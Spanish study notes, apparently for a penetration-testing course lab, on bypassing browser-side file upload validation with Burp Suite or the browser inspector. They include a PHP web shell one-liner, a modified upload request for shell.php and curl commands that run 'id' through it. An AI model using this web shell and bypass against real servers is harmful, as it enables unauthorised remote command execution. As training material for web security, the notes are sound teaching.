
## 1. Concepto

La validación del lado del cliente se realiza en el navegador mediante **HTML y JavaScript** antes de enviar el archivo al servidor.

Ejemplo de un formulario que solo permite imágenes:

```
<input type="file" name="uploadFile" id="uploadFile"
       onchange="checkFile(this)"
       accept=".jpg,.jpeg,.png">
```

- `accept=".jpg,.jpeg,.png"`: limita los tipos de archivo mostrados en el selector.
    
- `onchange="checkFile(this)"`: ejecuta una función JavaScript al seleccionar un archivo.
    
- `checkFile()`: comprueba la extensión y puede bloquear la subida si no es una imagen.
    

**Importante:** la validación del navegador no es una protección suficiente. El usuario puede modificar el código del front-end o manipular la petición HTTP.

## 2. Método 1: Modificar la petición con Burp Suite

### Paso 1. Interceptar una subida legítima

Sube una imagen normal y captura la petición HTTP con Burp Suite.

Ejemplo:

```
POST /upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitBoundary

------WebKitBoundary
Content-Disposition: form-data; name="uploadFile"; filename="HTB.png"
Content-Type: image/png

[CONTENIDO DEL ARCHIVO]
------WebKitBoundary--
```

### Paso 2. Modificar la petición

Cambia el nombre del archivo y el contenido enviado:

```
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
```

Puntos importantes:

- Cambiar `filename="HTB.png"` por `filename="shell.php"`.
    
- Sustituir el contenido de la imagen por el código PHP.
    
- `Content-Type` puede mantenerse sin modificar para esta prueba.
    
- Reenviar la petición al servidor.
    

### Paso 3. Comprobar el resultado

Si el servidor acepta el archivo y no valida correctamente su tipo, puede responder con un mensaje como:

```
File successfully uploaded
```

Si conocemos la ruta donde se guarda, podemos probar la web shell:

```
curl "http://TARGET/profile_images/shell.php?cmd=id"
```

Una respuesta que muestre el usuario del servidor, por ejemplo `www-data`, indicaría que el código PHP se está ejecutando.

> **Clave:** eliminar las restricciones del navegador no garantiza que la subida funcione. El servidor debe aceptar el archivo y permitir que el código se ejecute.

## 3. Método 2: Deshabilitar la validación JavaScript

También podemos modificar el código HTML desde las herramientas de desarrollador del navegador.

### Paso 1. Inspeccionar el formulario

En Firefox:

- `CTRL + SHIFT + C`: activar el inspector de elementos.
    
- Seleccionar el campo de subida de archivos.
    

Encontraremos una entrada similar a esta:

```
<input type="file" name="uploadFile" id="uploadFile"
       onchange="checkFile(this)"
       accept=".jpg,.jpeg,.png">
```

### Paso 2. Identificar la función de validación

En Firefox, abre la consola con:

```
CTRL + SHIFT + K
```

Consulta la función:

```
checkFile
```

La función puede contener una comprobación similar a esta:

```
if (extension !== 'jpg' &&
    extension !== 'jpeg' &&
    extension !== 'png') {

    $('#error_message').text("Only images are allowed!");
    File.form.reset();
    $("#submit").attr("disabled", true);
}
```

Cuando la extensión no está permitida, la aplicación muestra un error, reinicia el formulario y deshabilita el botón de subida.

### Paso 3. Eliminar la validación del campo

En el inspector, modifica temporalmente el HTML y elimina el atributo:

```
onchange="checkFile(this)"
```

El campo quedaría así:

```
<input type="file" name="uploadFile" id="uploadFile"
       accept=".jpg,.jpeg,.png">
```

También puedes eliminar:

```
accept=".jpg,.jpeg,.png"
```

Esto facilita seleccionar archivos con otras extensiones, aunque no es imprescindible si puedes elegir **All Files** en el selector.

### Paso 4. Subir la web shell

Selecciona el archivo PHP y utiliza el formulario normalmente.

Los cambios realizados en el inspector solo afectan al navegador y **no persisten al actualizar la página**. Sin embargo, pueden ser suficientes para evitar la validación del front-end.

### Paso 5. Localizar y probar el archivo

Después de subirlo, inspecciona la imagen de perfil. Puede aparecer una referencia como esta:

```
<img src="/profile_images/shell.php"
     class="profile-image"
     id="profile-image">
```

Prueba la ruta:

```
curl "http://TARGET/profile_images/shell.php?cmd=id"
```

Si el servidor ejecuta el PHP, podrás ejecutar comandos mediante el parámetro `cmd`.

## 4. Comparativa de métodos

|Método|Qué se modifica|Herramienta|
|---|---|---|
|Manipulación de petición|Nombre, contenido y otros campos de la petición de subida|Burp Suite|
|Modificación del HTML|Atributos del campo de archivo|Inspector del navegador|
|Eliminación de JavaScript|Función que comprueba la extensión|Inspector del navegador y consola|

## 5. Checklist para el laboratorio

1. Seleccionar un archivo permitido y capturar la petición con Burp.
    
2. Comprobar si la restricción se aplica únicamente en el navegador.
    
3. Modificar el nombre y contenido del archivo en la petición, o eliminar la validación JavaScript.
    
4. Enviar el archivo y comprobar la respuesta del servidor.
    
5. Identificar la ruta donde se almacena.
    
6. Probar si el servidor interpreta el archivo como código PHP.
    
7. Si no funciona, comprobar si existe validación en el back-end o si el directorio impide la ejecución de scripts.
    

## 🎯 Chuleta para el examen

- `**accept**`: limita los tipos de archivo disponibles en el selector; no garantiza que el servidor los valide.
    
- `**onchange**`: ejecuta una función cuando cambia el archivo seleccionado.
    
- `**checkFile()**`: función JavaScript que puede validar la extensión.
    
- **Burp Suite**: permite modificar la petición HTTP y saltarse las restricciones del front-end.
    
- **Inspector del navegador**: permite modificar temporalmente el HTML y deshabilitar validaciones JavaScript.
    
- **Validación exclusivamente en el cliente**: puede omitirse mediante la manipulación del navegador o de la petición.
    
- **Validación en el servidor**: debe comprobarse por separado; superar la validación del cliente no implica que el archivo vaya a ser aceptado o ejecutado.
